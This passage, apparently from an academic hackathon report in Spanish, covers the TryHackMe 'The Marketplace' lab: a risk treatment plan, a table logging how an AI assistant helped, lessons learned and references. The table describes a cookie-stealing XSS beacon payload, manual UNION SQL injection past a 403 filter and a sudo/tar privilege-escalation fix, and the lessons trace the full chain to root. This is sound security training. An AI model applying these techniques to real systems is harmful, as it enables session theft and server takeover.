+<tr><th>Riesgo</th><th>Trat.</th><th>Acción</th><th>Responsable</th><th>Prioridad</th><th>Verificación</th><th>R. residual</th></tr>
+<tr><td>R-01 XSS</td><td>Mitigar</td><td>Output encoding + CSP + HttpOnly</td><td>Equipo de desarrollo</td><td>Alta</td><td>Pruebas con payloads XSS</td><td>12 → 4</td></tr>
+<tr><td>R-02 SQLi</td><td>Mitigar</td><td>Prepared statements + validación</td><td>Equipo de desarrollo</td><td>Alta</td><td>sqlmap sin resultados</td><td>12 → 3</td></tr>
+<tr><td>R-03 Privesc</td><td>Mitigar</td><td>Quitar regla sudo/tar; retirar del grupo docker; hardening</td><td>Admin de sistemas</td><td>Alta</td><td>Revisión de permisos; <code>sudo -l</code></td><td>8 → 3</td></tr>
+<tr><td>R-04 Credenciales</td><td>Mitigar</td><td>Cifrar secretos; rotación; MFA</td><td>Desarrollo / IT</td><td>Media</td><td>Revisión de BD</td><td>9 → 3</td></tr>
+<tr><td>R-05 Monitoreo</td><td>Mitigar</td><td>Centralizar logs (SIEM) + reglas de detección</td><td>Equipo Blue Team</td><td>Media</td><td>Simulación de ataque detectada</td><td>9 → 4</td></tr>
+</table>
+
+<!-- 16 -->
+<h2>16. Aportes adicionales</h2>
+<p><b>Dashboard ejecutivo interactivo</b> de hallazgos, riesgos y prioridades (archivo <code>Dashboard-CyberRisk.html</code>):
+visualización por reto con filtrado de hallazgos por severidad, mapa de calor interactivo y barras de prioridad/riesgo residual.
+El panel del Reto 1 está completo; los retos 2–4 quedan como plantillas para el resto del equipo.
+Este aporte contribuye a habilitar el techo de 5.0 una vez completados los cuatro retos.</p>
+
+<!-- 17 -->
+<h2>17. Uso ético de la IA</h2>
+<table>
+<tr><th>Herramienta</th><th>Prompt (resumen)</th><th>Resultado</th><th>Validación</th><th>Ajustes realizados</th></tr>
+<tr><td>Claude (Anthropic)</td><td>"Dame el paso a paso para resolver The Marketplace (recon → explotación → escalada)"</td><td>Metodología por fases, comandos de nmap/SQLi/XSS y vías de escalada</td><td>Ejecutado en el laboratorio real (Fig. 1–21); 3/3 flags</td><td>La ruta real era <code>/item/N</code> (path) y la SQLi estaba en <code>/admin?user=</code>, no en <code>/item?id=</code> como sugería la guía inicial: se corrigió con pruebas manuales.</td></tr>
+<tr><td>Claude (Anthropic)</td><td>"El payload XSS me redirige mi propio navegador, ¿cómo robo la cookie sin redirigir?"</td><td>Payload <i>beacon</i> con <code>new Image().src</code> en vez de <code>document.location</code></td><td>El listener recibió el <code>token</code> de michael (admin)</td><td>Se cambió el payload redirector por el beacon para poder pulsar "Report".</td></tr>
+<tr><td>Claude (Anthropic)</td><td>"sqlmap devuelve 403 y marca el parámetro no inyectable, ¿por qué?"</td><td>Explicación del filtro/WAF y guía de UNION manual</td><td>La inyección manual <code>?user=3-1</code> y UNION SELECT sí funcionaron</td><td>Se descartó sqlmap y se explotó manualmente con UNION de 4 columnas.</td></tr>
+<tr><td>Claude (Anthropic)</td><td>"El exploit de tar falla con 'Bad fd number' / 'Permission denied'"</td><td>Diagnóstico: <code>dash</code> no soporta <code>&gt;&amp;</code>; el .tar previo era de jake</td><td>Shell de michael recibida tras corregir</td><td>Se cambió <code>exec=sh</code> por <code>exec=bash</code> y se borró <code>backup.tar</code> antes de disparar.</td></tr>
+<tr><td>Claude (Anthropic)</td><td>"Estructura el informe y el dashboard según la rúbrica (20 apartados)"</td><td>Plantilla del informe, mapa de calor, matriz de riesgos, controles ISO</td><td>Revisado y ajustado por el equipo; datos reales del lab</td><td>Se completaron los campos del equipo y se verificó cada hallazgo antes de incluirlo.</td></tr>
+</table>
+<p><b>Reflexión:</b> la IA se usó para estructurar y acelerar el trabajo, pero el equipo comprende y puede explicar cada paso.
+No se incorporaron vulnerabilidades, evidencias ni controles inventados: todo lo documentado proviene de la explotación real.
+Un punto notable fue entender <b>por qué sqlmap falló</b> (filtro 403) y por qué la <b>inyección UNION manual</b> sí tuvo éxito.</p>
+
+<!-- 18 -->
+<h2>18. Lecciones aprendidas</h2>
+<ul>
+<li><b>Técnicas:</b> el riesgo real surge del <i>encadenamiento</i> de fallos (XSS → sesión → SQLi → SSH → sudo/tar → docker → root), no de debilidades aisladas. La escalada tuvo dos saltos (jake → michael → root).</li>
+<li><b>De gestión:</b> traducir hallazgos técnicos a riesgos organizacionales y controles ISO es lo que aporta valor al negocio.</li>
+<li><b>De herramientas:</b> una herramienta automatizada (sqlmap) puede fallar ante filtros; comprender la vulnerabilidad permite explotarla manualmente.</li>
+<li><b>De equipo:</b> [completar: cómo se coordinaron, qué mejorarían].</li>
+</ul>
+
+<!-- 19 -->
+<h2>19. Conclusiones</h2>
+<p>La evaluación del Reto 1 evidenció que la plataforma de comercio electrónico de InnovaSec S.A.S. presenta riesgos
+<b>críticos</b> que permiten el compromiso total del servidor. Las causas se concentran en validación de entradas, gestión de
+credenciales y configuración del sistema. La aplicación de los controles ISO/IEC 27001:2022 seleccionados y el plan de
+tratamiento propuesto reducen los riesgos críticos a niveles medios/bajos. Se recomienda priorizar R-01 y R-02, cifrar
+credenciales (R-04) e implementar monitoreo centralizado (R-05).</p>
+
+<!-- 20 -->
+<h2>20. Referencias y anexos</h2>
+<b>Referencias:</b>
+<ul style="font-size:12.5px">
+<li>OWASP Top 10:2025 — https://top10.owasp.org/2025/</li>
+<li>ISO/IEC 27001:2022 — https://www.iso.org/standard/27001</li>
+<li>MAGERIT — https://administracionelectronica.gob.es/pae_Home/pae_Documentacion/pae_Metodolog/pae_Magerit.html</li>
+<li>INCIBE — https://www.incibe.es/empresas</li>
+<li>TryHackMe – The Marketplace — https://tryhackme.com/room/marketplace</li>
+<li>GTFOBins (tar, docker) — https://gtfobins.github.io/</li>
+</ul>
+<p><b>Anexos:</b> todas las capturas (Fig. 1–21) se encuentran en la carpeta <code>evidencias/</code>. Retos pendientes:
+PHP2Shell, dOOMs Day y Mr-Robot <span class="badge b-pend">PENDIENTE</span>.</p>
+
+<hr style="margin:40px 0 10px">
+<p style="text-align:center;font-size:11px;color:#8793a5">Informe generado para la Hackathon CyberRisk 2.0 — The Next Level · InnovaSec S.A.S. (escenario ficticio) · Documento académico</p>
+
+</div>
+</body>
+</html>
